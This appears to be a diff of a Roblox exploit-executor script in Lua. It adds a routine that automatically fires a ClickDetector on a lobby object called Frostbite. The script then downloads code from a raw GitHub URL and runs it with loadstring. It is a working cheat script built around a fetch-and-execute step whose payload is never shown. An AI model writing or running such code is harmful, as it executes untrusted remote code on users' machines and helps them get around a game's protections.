@@ -1,11 +1,27 @@
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
+-- Function to fire the ClickDetector
+local function fireClickDetector()
+    local clickDetector = workspace.Lobby.Frostbite.ClickDetector
+    if clickDetector then
+        fireclickdetector(clickDetector)
+    else
+        print("ClickDetector not found.")
+    end
+end
+
 -- Function to execute a loadstring from a URL
 local function executeLoadstring(url)
     local scriptCode = game:HttpGet(url)
     loadstring(scriptCode)()
 end
+
+-- Execute the ClickDetector fire
+fireClickDetector()
+
+-- Wait 1 millisecond (0.001 seconds)
+task.wait(0.001)
 
 -- Execute the first loadstring
 executeLoadstring('https://raw.githubusercontent.com/LoserGrape/Pooshiesty/main/Death')
